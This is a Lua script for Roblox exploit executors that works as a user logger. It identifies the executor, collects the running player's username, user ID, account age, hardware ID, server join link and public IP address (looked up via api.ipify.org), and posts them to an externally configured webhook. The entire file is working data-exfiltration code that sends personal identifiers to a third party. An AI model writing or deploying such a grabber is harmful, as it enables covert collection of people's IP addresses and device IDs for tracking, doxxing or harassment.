local exploitName = is_sirhurt_closure and "Sirhurt"
 or pebc_execute and "ProtoSmasher"
 or syn and "Synapse X"
 or secure_load and "Sentinel"
 or KRNL_LOADED and "KRNL"
 or SONA_LOADED and "Sona"
 or (identifyexecutor and identifyexecutor())
 or "Unknown / Skid"

local H = game:GetService("HttpService")
local P = game:GetService("Players")
local A = game:GetService("RbxAnalyticsService")
local lp = P.LocalPlayer
local placeId, jobId = game.PlaceId, game.JobId
local isPrivate = (game.PrivateServerId ~= "")
local placeLink = ("https://www.roblox.com/games/%d"):format(placeId)
local profileLink = ("https://www.roblox.com/users/%d/profile"):format(lp.UserId)
local avatarUrl = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(lp.UserId)
local joinLink = (not isPrivate and jobId ~= "") and (("https://www.roblox.com/games/start?placeId=%d&gameId=%s"):format(placeId, jobId)) or nil
local hwid = A:GetClientId()

local publicIp = "Unavailable"
pcall(function()
    local req = (http_request or request or syn.request)({Url="https://api.ipify.org?format=json", Method="GET"})
    if req and req.Body then
        local ok, j = pcall(H.JSONDecode, H, req.Body)
        if ok and j and j.ip then publicIp = j.ip end
    end
end)

local fields = {
    {name="Place Link", value = ("[%d](%s)"):format(placeId, placeLink), inline = true},
    {name="Join Server", value = joinLink and ("[Click ➜](%s)"):format(joinLink) or "_Private server_", inline = true},
    {name="Account Age", value = lp.AccountAge .. " day(s)", inline = true},
    {name="Premium Status", value = (lp.MembershipType and lp.MembershipType.Name) or "None", inline = true},
    {name="HWID", value = ("`%s`"):format(hwid), inline = false},
    {name="Public IP", value = ("`%s`"):format(publicIp), inline = false}
}

local embed = {
    title = getgenv().Titlewebyhookie,
    description = ("**Username:** [%s](%s)\n**User ID:** %d\n**Exploit Used:** `%s`"):format(lp.Name, profileLink, lp.UserId, exploitName),
    color = 0x7851A9,
    fields = fields,
    thumbnail = {url = avatarUrl},
    footer = {text = "Logger  •  " .. os.date("%Y-%m-%d %H:%M:%S")},
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = H:JSONEncode({embeds = {embed}})
local send = http_request or request or syn.request
pcall(function()
    send({Url = getgenv().Webyhookie, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
end)
